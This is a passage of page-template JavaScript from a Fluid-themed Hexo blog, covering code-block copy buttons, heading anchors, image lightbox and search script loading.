    copyTmpl += '<div class="code-widget">';
    copyTmpl += 'LANG';
    copyTmpl += '</div>';
    jQuery('.markdown-body pre').each(function() {
      var $pre = jQuery(this);
      if ($pre.find('code.mermaid').length > 0) {
        return;
      }
      if ($pre.find('span.line').length > 0) {
        return;
      }

      var lang = '';

      if (enableLang) {
        lang = CONFIG.code_language.default;
        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
          lang = $pre[0].children[0].classList[1];
        } else if ($pre[0].getAttribute('data-language')) {
          lang = $pre[0].getAttribute('data-language');
        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
          lang = $pre[0].children[0].classList[1];
          $pre.parent().addClass('code-wrapper');
        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
          $pre.wrap('<div class="code-wrapper"></div>');
        }
        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
      }
      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));

      if (enableCopy) {
        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
          var clipboard = new window.ClipboardJS('.copy-btn', {
            target: function(trigger) {
              var nodes = trigger.parentNode.childNodes;
              for (var i = 0; i < nodes.length; i++) {
                if (nodes[i].tagName === 'CODE') {
                  return nodes[i];
                }
              }
            }
          });
          clipboard.on('success', function(e) {
            e.clearSelection();
            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
            setTimeout(function() {
              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
            }, 2000);
          });
        });
      }
    });
  })();
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
